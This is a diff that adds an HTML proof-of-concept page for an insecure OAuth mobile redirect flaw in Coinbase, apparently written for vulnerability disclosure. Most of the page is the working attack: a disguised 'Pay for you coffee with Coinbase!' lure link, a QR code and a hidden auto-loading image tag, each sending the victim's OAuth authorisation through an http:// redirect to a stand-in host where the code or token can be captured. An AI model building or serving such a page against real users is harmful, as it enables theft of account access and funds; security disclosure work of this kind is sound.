@@ -1,0 +1,35 @@
+<!doctype html>
+    <head>
+        <title>Coinbase - Insecure OAuth Mobile Redirect Proof-Of-Concept</title>
+        <link href="http://netdna.bootstrapcdn.com/twitter-bootstrap/2.3.1/css/bootstrap-combined.min.css" rel="stylesheet">
+        <style type="text/css">
+          body {
+            padding-top: 30px; /* 60px to make the container go all the way to the bottom of the topbar */
+          }
+          .main {
+          	margin-top: 30px;
+         	}
+        </style>
+    </head>
+    <body>
+        <div class="navbar navbar-inverse navbar-fixed-top">
+          <div class="navbar-inner">
+            <div class="container">
+              <a class="brand" href="/">Coinbase - Insecure OAuth Mobile Redirect Proof-Of-Concept</a>
+          </div>
+        </div>
+
+        <div class="container main">
+          <div class="row span8 offset2">
+		        <h2>Malicious redirect page</h2>
+		        <p>This page could be served transparently as an iframe on an unsecured http:// response transmitted over network. This link is just for demonstration purposes. Once the victim had logged into a Coinbase account which had authenticated the Coinbase mobile app, their OAuth  code was being sent to <code>http://example.com/coinbase-redirect</code> as the OAuth redirect and this can be captured by an attacker on the local network, or remotely via DNS manipulation or compromise of http://example.com.</p>
+
+		   			<p style="display: block; margin: 0 auto; text-align:center"><a href="https://coinbase.com/oauth/authorize?response_type=code&client_id=34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5&redirect_uri=http://example.com/coinbase-redirect" style="border:0 none;cursor:default;text-decoration:none;"><img src="http://api.qrserver.com/v1/create-qr-code/?data=https%3A%2F%2Fcoinbase.com%2Foauth%2Fauthorize%3Fresponse_type%3Dcode%26client_id%3D34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5%26redirect_uri%3Dhttp%3A%2F%2Fexample.com%2Fcoinbase-redirect&#38;size=250x250&#38;prov=goqrme" /></a></p><br />
+		        <p style="display: block; margin: 0 auto; text-align:center"><code><a href="https://coinbase.com/oauth/authorize?response_type=code&client_id=34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5&redirect_uri=http://example.com/coinbase-redirect">Pay for you coffee with Coinbase!</a></code></p>
+		        <p><pre>&lt;a href=&quot;https://coinbase.com/oauth/authorize?response_type=code&amp;client_id=34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5&amp;redirect_uri=http://example.com/coinbase-redirect&quot;&gt;</pre></p>
+		        <img src="https://coinbase.com/oauth/authorize?response_type=token&client_id=34183b03a3e1f0b74ee6aa8a6150e90125de2d6c1ee4ff7880c2b7e6e98b11f5&redirect_uri=http://example.com/coinbase-redirect" />
+          </div>
+        </div> <!-- /container -->
+    </body>
+</html>
+
